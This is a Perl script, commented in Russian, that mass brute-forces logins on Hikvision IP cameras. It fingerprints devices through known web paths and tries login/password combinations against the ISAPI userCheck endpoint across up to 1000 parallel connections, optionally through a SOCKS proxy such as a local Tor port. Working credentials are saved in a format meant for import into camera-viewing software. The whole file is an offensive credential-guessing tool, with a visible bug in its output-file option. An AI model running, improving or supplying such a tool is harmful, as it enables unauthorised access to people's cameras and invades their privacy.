#!/usr/bin/env perl

use utf8;
use strict;
use warnings;

use List::Util qw/any uniq/;
use File::Slurp qw/read_file/;
use feature qw/say switch unicode_strings/;

use Coro;
use Coro::Timer;
use Coro::Select;
use LWP::UserAgent;
use LWP::Protocol::socks;

use Term::ProgressBar;
use Getopt::Args qw/optargs opt usage/;

opt help => (
    isa     => 'Bool',
    alias   => 'h',
    ishelp  => 1,
    comment => 'Show help message',
);

opt targets_file => (
    isa     => 'Str',
    alias   => 'tf',
    comment => 'Input file path with targets list',
);

opt combo_file => (
    isa     => 'Str',
    alias   => 'cf',
    comment => 'Input file path with login:password combos',
);

opt logins_file => (
    isa     => 'Str',
    alias   => 'lf',
    comment => 'Input file path with logins',
);

opt passwords_file => (
    isa     => 'Str',
    alias   => 'pf',
    comment => 'Input file path with passwords',
);

opt results_file => (
    isa     => 'Str',
    alias   => 'r',
    comment => 'Results file path',
);

opt threads => (
    isa     => 'Int',
    alias   => 't',
    default => 1000,
    comment => 'Number of parallel connections',
);

opt generate_login_combo => (
    isa     => 'Bool',
    alias   => 'glc',
    comment => 'Generate login:login combo list',
);

opt timeout => (
    isa     => 'Int',
    alias   => 'to',
    default => 12,
    comment => 'Timeout for connection to target in seconds',
);

opt proxy => (
    isa     => 'Str',
    alias   => 'p',
    comment => 'Proxy address in format socks5://127.0.0.1:9050',
);

opt debug => (
    isa     => 'Bool',
    alias   => 'd',
    default => 0,
    hidden  => 1,
    comment => 'Enable additional logging',
);

# Parse args to hash and prevent empty @ARGV
my $args = optargs(@ARGV);

# Run usage func imported from Getopt::Args for autogenerate help message
die usage() unless $args and %$args and @ARGV and not $args->{help};

# debug
require Data::Dumper if $args->{debug};

# Хеш авторизационных данных для проверки на дубликаты
my %comboHash;

# Массив авторизационных данных вида login:password
my @comboList;

# Список логинов
my @logins;

# Список паролей
my @passwords;

# Загружаем данные из файлов
if ($args->{combo_file}) {
    @comboList = uniq read_file($args->{combo_file}, chomp => 1);
    say 'Combinations loaded from file: ' . scalar(@comboList);
}

if ($args->{logins_file} && ($args->{generate_login_combo} || $args->{passwords_file})) {
    @logins = uniq read_file($args->{logins_file}, chomp => 1);
    say 'Logins loaded from file: ' . scalar(@logins);

    if ($args->{passwords_file}) {
        @passwords = uniq read_file($args->{passwords_file}, chomp => 1);
        say 'Passwords loaded from file: ' . scalar(@passwords);
    }
}

# Добавляем текущие авторизационные данные в хеш
%comboHash = map {$_ => 1} @comboList;

# Генерируем новые комбинации логинов и паролей
if (@logins > 0 and @passwords > 0) {
    my $combo_count = scalar(@comboList);

    push @comboList, map {
        $comboHash{$_} = 1;
        $_
    } grep {
        !exists $comboHash{$_};
    } map {
        my $login = $_;
        map {"$login:$_"} @passwords;
    } @logins;
    say 'Generated combinations (login:password): ' . (scalar(@comboList) - $combo_count);
}

# Генерируем новые комбинации из логинов
if (@logins > 0 && $args->{generate_login_combo}) {
    my $combo_count = scalar(@comboList);

    push @comboList, map {
        $comboHash{$_} = 1;
        $_
    } grep {
        !exists $comboHash{$_}
    } map {"$_:$_"} @logins;
    say 'Generated combinations (login:login): ' . (scalar(@comboList) - $combo_count);
}
say 'Total generated combinations: ' . scalar(@comboList);

undef(@logins);
undef(@passwords);
undef(%comboHash);

# Читаем айпишники в массив
my @ipList = grep {defined $_ and $_ ne ''} uniq read_file($args->{targets_file}, chomp => 1);
say 'IP list size: ' . scalar(@ipList);
say 'The total number of combinations for testing: ' . scalar(@ipList) * scalar(@comboList);

# Создаём прогрессбар
my $total_processed_combinations = 0;
my $progress = Term::ProgressBar->new({
    count => scalar(@ipList) * scalar(@comboList),
    name  => 'Bruteforcing',
    ETA   => 'linear'
});
$progress->update($total_processed_combinations);

# Создаем массив корутин
my @coroutines;
for (1 .. $args->{threads}) {
    push @coroutines, async {
        my $ua = LWP::UserAgent->new;
        $ua->timeout($args->{timeout});
        $ua->proxy([ qw(http https) ] => $args->{proxy})
            if $args->{proxy};

        # Обработка каждого IP адреса из списка
        while (my $ip_address = shift @ipList) {
            # chomp($ip_address);
            $ip_address =~ s/\R//g; # быстрее чем chomp

            unless ($ip_address && $ip_address ne '') {
                $total_processed_combinations += scalar(@comboList);
                $progress->update($total_processed_combinations);
                next;
            }

            # Проверяем, является ли устройство камерой
            if (is_camera($ip_address, $ua, $progress)) {
                my $is_password_found = 0;
                $progress->message('[Camera] ' . $ip_address);

                # Брутфорс логинов и паролей
                my $local_processed_combinations = 0;
                for my $combo (@comboList) {
                    my ($login, $password) = split /:/, $combo;

                    if (login($ip_address, $login, $password, $ua)) {
                        $progress->message('[Good Camera] ' . $login . ';' . $password . '@' . $ip_address);
                        save_good($ip_address, $login, $password);

                        $total_processed_combinations += $local_processed_combinations - scalar(@comboList);
                        $progress->update($total_processed_combinations);

                        $is_password_found = 1;
                        last;
                    }
                    else {
                        $local_processed_combinations++;
                        $total_processed_combinations++;
                        $progress->update($total_processed_combinations);
                    }
                }

                $progress->message('[Bad Camera] ' . $ip_address)
                    unless $is_password_found;
            }
            else {
                $progress->message('[Not Camera] ' . $ip_address);
                $total_processed_combinations += scalar(@comboList);
                $progress->update($total_processed_combinations);
            }
        }
    };
}

# Дожидаемся завершения выполнения всех корутин
$_->join for @coroutines;

# Проверяет камера ли это опираясь на набор сигнатур
sub is_camera {
    my ($ip, $ua, $progress_bar, $patterns, $retries) = @_;
    return 0 unless (defined $ip and defined $ua);

    my $dbg = $args->{debug};

    $patterns = {
        'http://%s/doc/page/login.asp'                 => qr#Hikvision#i,
        'http://%s/doc/i18n/en/Common.json'            => qr#Hikvision#i,
        'http://%s/doc/i18n/en/Config.json'            => qr#Hikvision#i,
        'http://%s/SDK/activateStatus'                 => qr#Hikvision#i,
        'http://%s/ISAPI/Security/extern/capabilities' => qr#Hikvision#i,
        'http://%s/SDK/language'                       => qr#hikvision#i
    } unless (defined $patterns);

    $retries //= 2;

    my $success = undef;
    foreach my $url_mask (keys %$patterns) {
        my $pattern = $patterns->{$url_mask};
        my $url = sprintf($url_mask, $ip);

        for (my $i = 0; $i < $retries; $i++) {
            my $resp = $ua->get($url);

            if ($i == 0) {
                $progress_bar->message("[R][i] Request to url: $url [" . $resp->status_line() . "]")
                    if $dbg;
            }
            else {
                $progress_bar->message("[R][i] Retry[" . ($i + 1) . "] Request to url: $url [" . $resp->status_line() . "]")
                    if $dbg;
            }

            if ($resp->is_success) {
                my ($pattern_str) = Data::Dumper::Dumper($pattern) =~ m!^\$VAR1\s+=\s+(.+);\s*$!
                    if $dbg;

                if (($resp->as_string() || '') =~ $pattern) {
                    $progress_bar->message("[S][+] Signature [ $pattern_str ] matched on url: $url")
                        if $dbg;
                }
                else {
                    $progress_bar->message("[S][-] Signature [ $pattern_str ] not match on url: $url")
                        if $dbg;
                }

                $success = 1;
                last; # Выходим из цикла retry поскольку запрос удалось выполнить
            }
            else {
                my $status_line = $resp->status_line();
                # Обработка тех самых странных ошибок которые говорят о том что удалённая железка офлайн
                if ($status_line =~ /^Can't connect/ || $status_line =~ /Connection refused/ || $status_line =~ /read timeout/) {
                    $progress_bar->message("[R][!] No Connection while trying to access $url: $status_line")
                        if $dbg;
                    $success = 0;
                }
                else {
                    $progress_bar->message("[R][!] Error while trying to access $url: $status_line")
                        if $dbg;
                    last;
                }
            }
        }

        last if defined $success and $success == 0;     # если вышли из retry и последний запрос не увенчался успехом
        return 1 if defined $success and $success == 1; # если вышли из retry найдя сигнатуру
    }

    return 0;
}

# Проверяет возможность авторизации с заданными учетными данными на камере с заданным IP
sub login {
    my ($ip, $username, $password, $ua) = @_;
    return 0 unless defined $ip && defined $username && defined $password && defined $ua;

    # Создаем пакет
    my $request = HTTP::Request->new(GET => "http://$ip/ISAPI/Security/userCheck");
    $request->authorization_basic($username, $password);

    my $resp = $ua->request($request);
    return 1 if ($resp->decoded_content || '') =~ m#<statusString>OK</statusString>#;
    return 0;
}

# Сохраняем IP-адрес, имя пользователя и пароль в файл iVMS-4200
sub save_good {
    my ($ip, $login, $password) = @_;

    # Открываем файл на запись
    open(GOOD, '>>', $args->{output})
        or die "Can't open output good file:" . $args->{output} . " [$!]";

    # Формируем строку, содержащую IP-адрес, имя пользователя и пароль, и записываем ее в файл
    my $line = qq("PokPokPok","0","$ip","8000","0","$login","$password","0","0","0","0"$/);
    print GOOD $line;

    # Закрываем файл
    close(GOOD);
}
